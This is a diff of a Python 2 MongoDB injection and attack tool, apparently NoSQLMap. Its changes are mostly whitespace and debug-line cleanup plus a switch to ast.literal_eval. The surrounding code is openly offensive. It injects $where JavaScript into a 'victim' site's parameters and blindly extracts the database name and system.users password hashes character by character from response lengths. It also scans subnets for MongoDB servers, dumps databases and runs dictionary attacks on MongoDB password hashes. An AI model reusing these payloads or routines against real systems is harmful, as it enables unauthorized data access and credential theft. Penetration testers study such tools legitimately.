@@ -279,11 +279,8 @@ def options():
 				myPort = optList[5]
 				
 				if httpMethod == "POST":
-					postData = csvOpt[1]
+					postData = ast.literal_eval(csvOpt[1])
 				
-				
-				
-			
 				#Set option checking array based on what was loaded
 				x = 0
 				for item in optList:
@@ -528,7 +525,6 @@ def postApps():
 		req = urllib2.Request(appURL,body)
 		appRespCode = urllib2.urlopen(req).getcode()
 		
-		#normLength = int(len(urllib.urlopen(appURL).read()))
 		if appRespCode == 200:
 			
 			normLength = int(len(urllib2.urlopen(req).read()))
@@ -542,7 +538,6 @@ def postApps():
 			if verb == "ON":
 				print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
 				
-			
 			else:
 				print "App is up!"
 			appUp = True
@@ -572,9 +567,8 @@ def postApps():
 		injectString = randInjString(int(injectSize))
 		print "Using " + injectString + " for injection testing.\n"
 		
-		
 		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
-		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
+		#Add error handling for Non-200 HTTP response codes if random strings freak out the app.
 		postData.update({injOpt:injectString})
 		if verb == "ON":
 			print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
@@ -637,7 +631,6 @@ def postApps():
 		else:
 			print "Test 3: $where injection (integer escape)"
 		
-		
 		injLen = int(len(urllib2.urlopen(req).read()))
 		checkResult(randLength,injLen,testNum)
 		testNum += 1
@@ -668,7 +661,6 @@ def postApps():
 		
 		else:
 			print "Test 5: $where injection integer escape (single record)"
-		
 		
 		injLen = int(len(urllib2.urlopen(req).read()))
 		checkResult(randLength,injLen,testNum)
@@ -821,8 +813,7 @@ def getApps():
 	str24 = False
 	global int24
 	int24 = False
-	
-	
+		
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
@@ -838,8 +829,6 @@ def getApps():
 			end = time.time()
 			timeReq.close()
 			timeBase = round((end - start), 3)
-			
-			
 			
 			if verb == "ON":
 				print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
@@ -870,7 +859,6 @@ def getApps():
 		
 		randLength = int(len(urllib.urlopen(randomUri).read()))
 		print "Got response length of " + str(randLength) + "."
-		
 		randNormDelta = abs(normLength - randLength)
 		
 		if randNormDelta == 0: 
@@ -1140,8 +1128,7 @@ def randInjString(size):
 	
 		elif format == "4":
 			chars = string.ascii_letters + string.digits
-			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
-		
+			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'	
 		else:
 			format = True
 			print "Invalid selection."
@@ -1158,7 +1145,7 @@ def buildUri(origUri, randValue):
 	try:
 		split_uri = origUri.split("?")
 		params = split_uri[1].split("&")
-	
+		
 	except:
 		raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
 		return
@@ -1174,16 +1161,14 @@ def buildUri(origUri, randValue):
 		print str(menuItem) + "-" + params
 		menuItem += 1
 		
-	
-	
 	try:
 		injIndex = raw_input("Which parameter should we inject? ")
 		injOpt = str(paramName[int(injIndex)-1])
 		print "Injecting the " + injOpt + " parameter..."
+	
 	except:
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
 		return
-	
 	
 	x = 0
 	uriArray[0] = split_uri[0] + "?"
@@ -1297,7 +1282,7 @@ def stealDBs(myDB):
 			stealDBs(myDB)
 		
 		else:
-			return()
+			return
 	
 	except:
 		if str(sys.exc_info()).find('text search not enabled') != -1:
@@ -1323,7 +1308,6 @@ def massMongo():
 	while optCheck:
 		loadOpt = raw_input("Select a scan method: ")
 		
-	
 		if loadOpt == "1":
 			subnet = raw_input("Enter subnet to scan: ")
 		
@@ -1393,7 +1377,6 @@ def massMongo():
 def gen_pass(user, passw):
 	return md5(user + ":mongo:" + str(passw)).hexdigest();
 
-
 def brute_pass(user,key):
 	loadCheck = False
 	
@@ -1405,7 +1388,6 @@ def brute_pass(user,key):
 			loadCheck = True
 		except:
 			print " Couldn't load file."
-	
 	
 	print "Running dictionary attack..."
 	for passGuess in passList:
@@ -1444,7 +1426,6 @@ def getDBInfo():
 	baseLen = int(len(urllib.urlopen(trueUri).read()))
 	print "Got baseline true query length of " + str(baseLen)
 	
-	
 	print "Calculating DB name length..."
 	
 	while gotNameLen == False:
@@ -1463,12 +1444,8 @@ def getDBInfo():
 	print "Database Name: ", 		
 	while gotDbName == False:
 		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
-		#print "Debug: " + charUri
-		
 		lenUri = int(len(urllib.urlopen(charUri).read()))
-		#print "debug: " + str(charCounter)
-		#print "Debug length: " + str(lenUri)
-		
+
 		if lenUri == baseLen:
 			dbName = dbName + chars[charCounter]
 			print chars[charCounter],
@@ -1599,14 +1576,12 @@ def getDBInfo():
 				rightCharsUsr = 0
 				usrChars = 0
 				
-
 				while rightCharsHash < 32:  #Hash length is static
 					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
 					lenUri = int(len(urllib.urlopen(hashUri).read()))
 						
 					if lenUri == baseLen:
 						pwdHash = pwdHash + chars[charCounterHash]
-						#print pwdHash
 						rightCharsHash += 1
 						charCounterHash = 0
 							
